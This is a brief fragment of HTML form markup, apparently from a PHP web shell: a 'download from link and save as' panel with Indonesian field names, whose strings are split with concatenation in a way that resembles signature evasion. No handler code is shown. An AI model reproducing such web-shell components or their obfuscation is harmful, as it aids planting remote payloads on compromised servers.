...
<input type="text" name="darilink" class="up" size="59" placeholder="https://lad'.'ev'.'pan'.'el">&nbsp;<input type="text" name="namalink" class="up" size="14" placeholder="sa'.'ved.'.'txt"><input type="submit" name="linknya" class="up" value="G'.'0!" style="cursor: pointer; border-color: #fff">
